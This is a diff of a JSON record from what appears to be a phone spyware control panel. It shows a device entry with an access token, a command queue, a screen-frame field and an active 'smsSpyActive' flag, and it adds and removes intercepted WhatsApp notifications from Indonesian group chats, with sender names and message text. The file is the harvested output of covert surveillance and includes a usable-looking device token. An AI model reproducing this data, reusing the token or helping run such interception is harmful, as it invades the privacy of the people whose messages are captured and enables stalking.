@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777178400067,
+    "lastSeen": 1777178403310,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (405 pesan): 📣 Menyebut Anda",
+        "content": "~ hanz: bacot lu karbit",
+        "time": "26/04 12:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178404178
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (404 pesan): 📣 Menyebut Anda",
+        "content": "~ hanz: bacot lu karbit",
+        "time": "26/04 12:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178403416
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡",
+        "content": "‎404 pesan baru",
+        "time": "26/04 12:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178403386
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡",
+        "content": "‎403 pesan baru",
+        "time": "26/04 12:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178402991
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (403 pesan): 📣 Menyebut Anda",
@@ -3987,38 +4019,6 @@
         "time": "26/04 11:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173239443
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (179 pesan): ~ kkeu",
-        "content": "siapa cakepbbgt",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173239440
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (39 pesan): ~ Jz12",
-        "content": "📷 YAKIN GAMAU BELI UNCHECK RAMA STORE?MUMPUNG GACOR JAMIN DPT INI YANG MAU BELI AJA😋😋",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173239437
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (139 pesan): ~ petani ngawi",
-        "content": "📷 ‎1 foto",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173239434
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐉𝐁 𝟏  || 𝐊𝐈𝐍𝐆 𝐕𝐀𝐋𝐙  ✨ (95 pesan): ~ Hudzz Sturee",
-        "content": "📷 op?30+ gb+sl angkut sumua mc/direct bebas",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173239045
       }
     ],
     "galleryPhotos": [],
